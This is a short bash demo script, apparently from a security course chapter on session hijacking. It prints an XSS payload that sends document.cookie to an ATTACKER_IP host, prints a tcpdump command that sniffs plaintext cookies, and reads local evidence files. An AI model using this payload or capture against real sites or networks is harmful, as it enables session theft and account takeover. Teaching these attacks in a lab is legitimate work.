#!/bin/bash
# Chapter 11 Demonstration Script

echo "=== Chapter 11 - Session Hijacking Demo ==="
echo ""

echo "[DEMO 1] XSS Cookie Theft Simulation"
echo "--------------------------------------"
echo "XSS Payload:"
echo "<script>document.location='http://ATTACKER_IP:8888/steal.php?cookie='+document.cookie</script>"
echo ""
echo "Expected Result: Session cookie captured and stored in cookies.txt"
echo ""

echo "[DEMO 2] Network Sidejacking Simulation"
echo "----------------------------------------"
echo "Network Capture Command:"
echo "sudo tcpdump -i eth0 -A 'tcp port 80' | grep -i cookie"
echo ""
echo "Expected Result: Unencrypted session cookies visible in network traffic"
echo ""

echo "[DEMO 3] Evidence Verification"
echo "-------------------------------"
echo "Captured Session Data:"
cat ~/session_hijacking/cookies.txt 2>/dev/null || echo "No cookies.txt found"
echo ""
echo "Practical 11.1 Status:"
cat ~/session_hijacking/practical_11.1_evidence.txt 2>/dev/null || echo "Evidence file not found"
echo ""
echo "Practical 11.2 Status:"
cat ~/session_hijacking/practical_11.2_evidence.txt 2>/dev/null || echo "Evidence file not found"